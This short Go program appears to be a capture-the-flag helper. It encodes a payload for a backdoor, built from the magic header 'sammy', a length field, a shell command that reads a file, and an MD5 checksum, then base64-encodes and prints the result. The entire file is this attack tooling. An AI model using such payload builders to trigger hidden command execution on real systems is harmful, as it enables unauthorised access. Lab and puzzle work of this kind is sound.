package main

import (
	"crypto/md5"
	b64 "encoding/base64"
	"encoding/binary"
	"fmt"
)

func en64(data []byte) string {
	return b64.StdEncoding.EncodeToString([]byte(data))
}

func int2Byte(i int32) (arr [4]byte) {
	binary.BigEndian.PutUint32(arr[0:4], uint32(i))
	return
}

func main() {
	backdoorHeader := [...]byte{115, 97, 109, 109, 121} // sammy
	//cmd := "ls -la"
	cmd := "cat maybe_check_this_file.txt" // shell command to execute
	cmdLen := int2Byte(int32(len(cmd)))    // int32 of command length
	hash := md5.Sum([]byte(cmd))           // md5 hash

	allTogether := string(backdoorHeader[:]) + string(cmdLen[:]) + cmd + string(hash[:])
	output := en64([]byte(allTogether))
	fmt.Println(output)
}
